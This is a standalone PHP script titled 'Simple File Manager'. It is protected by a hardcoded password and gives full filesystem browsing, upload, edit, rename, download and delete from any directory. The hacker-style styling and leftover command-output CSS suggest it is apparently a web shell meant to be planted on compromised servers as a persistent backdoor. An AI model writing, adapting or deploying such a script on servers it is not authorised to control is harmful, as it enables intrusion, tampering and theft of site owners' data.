<?php
session_start();

$password = "holahermano";

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

if (!isset($_SESSION['logged_in'])) {
    if (isset($_POST['login_pass'])) {
        if ($_POST['login_pass'] === $password) {
            $_SESSION['logged_in'] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = "Wrong password!";
        }
    }
    ?>
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width,initial-scale=1.0">
        <title>Login</title>
        <style>
            body {
                background: #111;
                color: #fff;
                font-family: Arial, sans-serif;
                display: flex;
                align-items: center;
                justify-content: center;
                height: 100vh;
            }
            form {
                background: #1c1c1c;
                padding: 20px 30px;
                border-radius: 10px;
                box-shadow: 0 0 10px #0f0;
            }
            input[type=password] {
                padding: 8px;
                border: none;
                border-radius: 5px;
                width: 200px;
            }
            input[type=submit] {
                background: #0f0;
                border: none;
                padding: 8px 14px;
                border-radius: 5px;
                cursor: pointer;
                margin-top: 10px;
            }
            .error { color: red; font-size: 0.9em; }
        </style>
    </head>
    <body>
        <form method="post">
            <h2>üîê Simple File Manager</h2>
            <?php if(isset($error)) echo "<p class='error'>$error</p>"; ?>
            <input type="password" name="login_pass" placeholder="Enter password"><br>
            <input type="submit" value="Login">
        </form>
    </body>
    </html>
    <?php
    exit;
}

function breadcrumb($dir) {
    $parts = explode(DIRECTORY_SEPARATOR, $dir);
    $path = '';
    $breadcrumb = [];
    foreach ($parts as $part) {
        if ($part === '') continue;
        $path .= ($path ? DIRECTORY_SEPARATOR : '') . $part;
        $breadcrumb[] = "<a href='?dir=/" . urlencode($path) . "'>" . htmlspecialchars($part) . "</a>";
    }
    return implode("/", $breadcrumb);
}

function listDirectory($dir) {
    $files = scandir($dir);
    echo "<div class='file-container'>";
    echo "<div class='top-bar'><h2>üìÅ " . breadcrumb($dir) . "</h2>";
    echo "</div>";

    $parentDir = dirname($dir);
    if ($dir !== '/') {
        echo "<a class='btn' href='?dir=/" . urlencode($parentDir) . "'>‚¨Ö Go Back</a><br><br>";
    }

    echo "<a href='?logout=1' class='btn btn-logout'>üîì Logout</a><br><br>";

    echo "<div class='actions-container'>
            <form method='post'>
                <input type='text' name='new_file_name' placeholder='Enter new file name' required>
                <input class='btn' type='submit' name='create_file' value='Create File'>
            </form>
            <form method='post' enctype='multipart/form-data'>
                <input type='file' name='file_to_upload' required>
                <input class='btn' type='submit' name='upload_file' value='Upload File'>
            </form>
            <form method='post'>
                <input type='submit' class='btn' name='compress_folder' value='Download Compressed Folder'>
            </form>
          </div>";

    echo "<table><tr><th>Name</th><th>Type</th><th>Action</th></tr>";
    foreach ($files as $file) {
        if ($file !== '.' && $file !== '..') {
            $fullPath = "$dir/$file";
            $type = is_dir($fullPath) ? "Folder" : "File";
            echo "<tr>";
            if (is_dir($fullPath)) {
                echo "<td>üìÇ <a href='?dir=/" . urlencode($fullPath) . "'>$file</a></td>";
            } else {
                echo "<td>üìÑ $file</td>";
            }
            echo "<td>$type</td>";
            echo "<td>
                    <a class='btn btn-view' href='?view=" . urlencode($fullPath) . "'>View</a>
                    <a class='btn btn-edit' href='?edit=" . urlencode($fullPath) . "'>Edit</a>
                    <a class='btn btn-rename' href='?rename=" . urlencode($fullPath) . "'>Rename</a>
                    <a class='btn btn-dl' href='?download=" . urlencode($fullPath) . "'>Download</a>
                    <a class='btn btn-del' href='?delete=" . urlencode($fullPath) . "' onclick=\"return confirm('Delete this file?');\">Delete</a>
                  </td>";
            echo "</tr>";
        }
    }
    echo "</table>";
    echo "</div></div>";
}

function createFile($dir, $fileName) {
    $filePath = "$dir/$fileName";
    if (!file_exists($filePath)) file_put_contents($filePath, "");
    else echo "<p class='error'>‚ö†Ô∏è File exist.</p>";
}

function uploadFile($dir) {
    if (isset($_FILES['file_to_upload']) && $_FILES['file_to_upload']['error'] == 0) {
        move_uploaded_file($_FILES['file_to_upload']['tmp_name'], $dir . '/' . basename($_FILES['file_to_upload']['name']));
    }
}

function deleteFile($filePath) {
    if (is_dir($filePath)) {
        rmdir($filePath);
    } else {
        unlink($filePath);
    }
    $dir = urlencode(dirname($filePath));
    header("Location: ?dir=$dir");
    exit;
}

function renameFile($filePath) {
    if (isset($_POST['new_name'])) {
        $newPath = dirname($filePath) . DIRECTORY_SEPARATOR . $_POST['new_name'];
        if (rename($filePath, $newPath)) {
            header("Location: ?dir=" . urlencode(dirname($filePath)));
            exit;
        } else {
            echo "<p class='error'>‚ùå Failed to rename file.</p>";
        }
    }
    echo "<div class='file-container'>
            <h2>‚úèÔ∏è Rename: " . basename($filePath) . "</h2>
            <form method='post'>
                <input type='text' name='new_name' value='" . htmlspecialchars(basename($filePath)) . "' required>
                <input class='btn' type='submit' value='Rename'>
            </form>
            <a class='btn' href='?dir=/" . urlencode(dirname($filePath)) . "'>‚¨Ö Back</a>
          </div>";
}

function downloadFile($filePath) {
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . basename($filePath) . '"');
    header('Content-Length: ' . filesize($filePath));
    readfile($filePath);
    exit;
}

function viewFile($filePath) {
    $content = htmlspecialchars(file_get_contents($filePath));
    echo "<div class='file-container'><h2>üëÅ Viewing: " . basename($filePath) . "</h2><pre>$content</pre>
          <a class='btn' href='?dir=/" . urlencode(dirname($filePath)) . "'>‚¨Ö Back</a></div>";
}

function editFile($filePath) {
    if (isset($_POST['content'])) file_put_contents($filePath, $_POST['content']);
    $content = htmlspecialchars(file_get_contents($filePath));
    echo "<div class='file-container'><h2>‚úèÔ∏è Edit: " . basename($filePath) . "</h2>
          <form method='post'><textarea name='content'>$content</textarea><br><br>
          <input class='btn btn-edit' type='submit' value='Save'></form>
          <a class='btn' href='?dir=/" . urlencode(dirname($filePath)) . "'>‚¨Ö Back</a></div>";
}

if (isset($_GET['view'])) viewFile(realpath($_GET['view']));
elseif (isset($_GET['edit'])) editFile(realpath($_GET['edit']));
elseif (isset($_GET['rename'])) renameFile(realpath($_GET['rename']));
elseif (isset($_GET['download'])) downloadFile(realpath($_GET['download']));
elseif (isset($_GET['delete'])) deleteFile(realpath($_GET['delete']));
elseif (isset($_POST['create_file'])) createFile(realpath($_GET['dir'] ?? '.'), $_POST['new_file_name']);
elseif (isset($_POST['upload_file'])) uploadFile(realpath($_GET['dir'] ?? '.'));
else {
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <title>üìÅ Simple File Manager</title>
    <style>
        body {
            font-family: "Segoe UI", sans-serif;
            background: #f9f9f9;
            margin: 0;
            padding: 0;
        }
        footer {
            text-align: center;
            padding: 15px;
            font-size: 14px;
            color: #ffffffff;
            border-top: 1px solid #1b1b1b;
            margin-top: 30px;
            background-color: #1b1b1b;
        }
        footer span {
            color: #e25555;
        }
    </style>
</head>
<body>
<?php
    listDirectory(realpath($_GET['dir'] ?? '.'));
?>
<footer>
    Made with <span>‚ù§Ô∏è</span> by SimpleMan
</footer>
</body>
</html>
<?php
}
?>

<style>
body {
    font-family: Consolas, monospace;
    background-color: #0b0b0b;
    color: #fff;
    text-align: center;
}
a { color: #4af; text-decoration: none; }
a:hover { text-decoration: underline; }
.file-container {
    display: inline-block;
    text-align: left;
    background: #1b1b1b;
    padding: 20px;
    margin-top: 40px;
    border-radius: 10px;
    box-shadow: 0 0 15px #000;
    min-width: 700px;
}
.top-bar {
    display: flex;
    justify-content: space-between;
    align-items: center;
}
.btn {
    padding: 5px 10px;
    border-radius: 6px;
    border: none;
    font-size: 13px;
    color: #fff;
    cursor: pointer;
    text-decoration: none;
}
.btn-view { background: #4caf50; }
.btn-edit { background: #ffc107; color:#000; }
.btn-rename { background: #17a2b8; }
.btn-del { background: #e74c3c; }
.btn-dl { background: #007bff; }
.btn-logout { background: #ff4444; }
.btn:hover { opacity: 0.8; }

table {
    width: 100%;
    border-collapse: collapse;
    margin-top: 15px;
}
th, td {
    border-bottom: 1px solid #333;
    padding: 8px;
    text-align: left;
}
tr:hover { background: #222; }

textarea {
    width: 100%;
    height: 400px;
    background: #000;
    color: #0f0;
    border: 1px solid #555;
    font-family: monospace;
    padding: 10px;
}

.cmd-section {
    margin-top: 30px;
    background: #111;
    padding: 15px;
    border-radius: 8px;
}
input[type=text] {
    width: 70%;
    padding: 8px;
    background: #000;
    color: #0f0;
    border: 1px solid #444;
}
.cmd-output {
    background: #000;
    color: #0f0;
    padding: 10px;
    margin-top: 10px;
    border-radius: 5px;
    overflow-y: auto;
    max-height: 300px;
}
</style>